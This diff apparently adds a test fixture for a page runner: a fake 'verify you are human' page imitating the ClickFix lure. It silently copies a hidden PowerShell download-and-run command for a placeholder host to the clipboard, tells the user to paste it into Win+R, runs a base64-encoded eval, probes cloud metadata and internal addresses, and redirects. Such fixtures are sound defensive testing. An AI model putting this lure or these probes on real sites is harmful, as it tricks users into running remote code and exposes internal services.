@@ -1,0 +1,26 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Verify you are human</title></head>
+<body>
+<h2>I'm not a robot</h2>
+<p>Press Win+R, paste with Ctrl+V and press Enter to complete verification.</p>
+<button id="verify">Verify</button>
+<script>
+  // Benign fixture of the ClickFix lure: writes a command to the clipboard.
+  var cmd = 'powershell -w hidden -c "iwr http://payload.example.invalid/x.ps1 | iex"';
+  function lure() {
+    if (navigator.clipboard) { navigator.clipboard.writeText(cmd).catch(function () {}); return; }
+    // Fallback used by real kits on plain-http pages, where navigator.clipboard is absent.
+    var t = document.createElement('textarea');
+    t.value = cmd; document.body.appendChild(t); t.select();
+    document.execCommand('copy'); t.remove();
+  }
+  document.getElementById('verify').addEventListener('click', lure);
+  lure();
+  // Obfuscated-looking script (fixture only; decodes to a console message).
+  eval(atob('Y29uc29sZS5sb2coImZpeHR1cmUtb2JmdXNjYXRlZCIp'));
+  // Internal-range probes the runner must block (CAP-9).
+  new Image().src = 'http://169.254.169.254/latest/meta-data/';
+  fetch('http://10.1.2.3/').catch(function () {});
+  setTimeout(function () { location.href = '/download.html'; }, 1500);
+</script>
+</body></html>
